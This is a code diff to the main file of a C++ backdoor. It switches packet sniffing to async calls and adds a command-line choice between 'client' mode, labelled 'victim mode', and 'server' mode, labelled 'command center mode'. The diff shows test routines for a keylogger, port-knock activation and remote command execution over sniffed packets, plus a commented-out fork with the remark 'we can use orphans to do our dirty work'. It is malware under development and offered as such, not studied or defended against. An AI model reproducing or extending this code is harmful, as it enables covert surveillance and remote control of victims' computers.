@@ -37,9 +37,9 @@ void testKnock(const Properties &p) {
     unsigned int knockDuration = std::stoi(p.at("knockDuration"));
 
     NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
-    netEngine.startSniff("ip and udp");
+    netEngine.startAsyncSniff("ip and udp");
     netEngine.knockAndSend(*netEngine.getIp(), data);
-    netEngine.stopSniff();
+    netEngine.stopAsyncSniff();
 }
 
 // TODO: Remove
@@ -57,13 +57,13 @@ void testRce(const Properties &p) {
     NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
 
     netEngine.LoopCallbacks.push_back(RemoteCodeExecuter::netCallback);
-    netEngine.startSniff("ip and tcp");
+    netEngine.startAsyncSniff("ip and tcp");
 
     sleep(1);
     RemoteCodeExecuter::sendCommand(&netEngine, daddr, testCmd);
 
     sleep(30);
-    netEngine.stopSniff();
+    netEngine.stopAsyncSniff();
 }
 
 // TODO: Remove
@@ -83,12 +83,38 @@ void testRceRes(const Properties &p) {
 int main(int argc, char *argv[]) {
     Properties p = getConfig("backdoor.conf");
 
-    // testKeylogger(p);
-    // testKnock(p);
-    testRce(p);
-    // testRceRes(p);
+    if (argc != 2) {
+        printUsage(argv[0]);
+        return 0;
+    }
+
+    std::string option(argv[1]);
+
+    if (option == "client") {
+        return clientMode(p);
+    }
+
+    if (option == "server") {
+        return serverMode(p);
+    }
+
+    if (option == "test") {
+        // testKeylogger(p);
+        // testKnock(p);
+        testRce(p);
+        // testRceRes(p);
+    }
+
+    printUsage(argv[0]);
 
     return 0;
+}
+
+void printUsage(const char *name) {
+    std::cout << "Usage: " << name << " [client|server|test]" << std::endl;
+    std::cout << "\tclient - client mode a.k.a victim mode" << std::endl;
+    std::cout << "\tserver - server mode a.k.a command center mode" << std::endl;
+    std::cout << "\ttest - testing mode" << std::endl;
 }
 
 /*
@@ -127,3 +153,45 @@ Properties getConfig(const std::string &filename) {
 
     return properties;
 }
+
+/*
+ * The main entry point for client mode or "victim mode".
+ *
+ * Params:
+ *      const Properties &p: The list of configuration properties.
+ *
+ * Return:
+ *      The exit code for the application.
+ */
+int clientMode(const Properties &p) {
+
+    /*
+    // we can use orphans to do our dirty work
+    if (fork()) {
+        return 0;
+    }
+    */
+
+    const std::string &interface = p.at("interface");
+    const std::string &key = p.at("key");
+
+    const std::string &knockPattern = p.at("knockPattern");
+    unsigned short knockPort = std::stoi(p.at("knockPort"));
+    unsigned int knockDuration = std::stoi(p.at("knockDuration"));
+
+    NetworkEngine netEngine(interface, key, knockPattern, knockPort, knockDuration);
+    netEngine.startSyncSniff("ip");
+
+    return 0;
+}
+
+/*
+ * The main entry point for server mode or "command center".
+ *
+ * Params:
+ *      const Properties &p: The list of configuration properties.
+ *
+ * Return:
+ *      The exit code for the application.
+ */
+int serverMode(const Properties &p) { return 0; }
